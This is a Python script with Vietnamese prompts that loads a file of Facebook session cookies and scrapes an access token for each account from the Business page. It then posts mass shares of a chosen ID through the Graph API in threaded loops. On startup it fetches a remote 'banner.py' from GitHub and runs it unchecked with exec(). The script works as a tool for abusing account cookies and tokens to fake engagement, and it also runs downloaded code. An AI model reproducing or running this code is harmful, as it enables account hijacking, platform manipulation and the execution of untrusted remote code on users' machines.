import os
import sys
import requests
import threading
import time

gome_token = []

def get_token(input_file):
    for cookie in input_file:
        headers = {
            'authority': 'business.facebook.com',
            'accept': '*/*',
            'cookie': cookie,
            'referer': 'https://www.facebook.com/',
            'sec-fetch-mode': 'navigate',
        }
        try:
            res = requests.get('https://business.facebook.com/content_management', headers=headers).text
            token = res.split('EAAG')[1].split('","')[0]
            gome_token.append(f'{cookie}|EAAG{token}')
        except:
            pass
    return gome_token

def share(tach, id_share):
    cookie, token = tach.split('|')
    headers = {
        'accept': '*/*',
        'cookie': cookie,
        'host': 'graph.facebook.com'
    }
    try:
        requests.post(
            f'https://graph.facebook.com/me/feed?link=https://m.facebook.com/{id_share}&published=0&access_token={token}',
            headers=headers
        )
    except:
        pass

def main_share():
    exec(requests.get('https://raw.githubusercontent.com/HgAnh7/Tool/main/banner.py').text)
    input_file = open(input("\033[1;97m=> \033[1m\033[98;5;51mNhập tên file chứa Cookies: \033[1;97m")).read().splitlines()
    id_share = input("\033[1;97m=> \033[1m\033[98;5;51mNhập ID Cần Share: \033[1;97m")
    delay = int(input("\033[1;97m=> \033[1m\033[98;5;51mNhập Delay Share: \033[1;97m"))
    total_share = int(input("\033[1;97m=> \033[1m\033[98;5;51mSố lượng Share thì dừng: \033[1;97m"))
    print(f'\033[1;91m────────────────────────────────────────')
    accounts = get_token(input_file)
    if not accounts:
        print("\033[1;91mKhông có tài khoản hợp lệ.")
        return

    stt = 0
    while stt < total_share:
        for acc in accounts:
            stt += 1
            threading.Thread(target=share, args=(acc, id_share)).start()
            print(f"\033[1;91m[\033[1;97m{stt}\033[1;91m] \033[1;94mShare thành công ID: \033[1;95m{id_share}")
            time.sleep(delay)
            if stt >= total_share:
                break

    gome_token.clear()
    input("\033[1;92m✅ \033[0mShare hoàn tất! Nhấn Enter để chạy lại...")

if __name__ == "__main__":
    try:
        while True:
            main_share()
    except KeyboardInterrupt:
        print("\n\033[1;91m⛔ \033[0mDừng chương trình.")
        sys.exit()
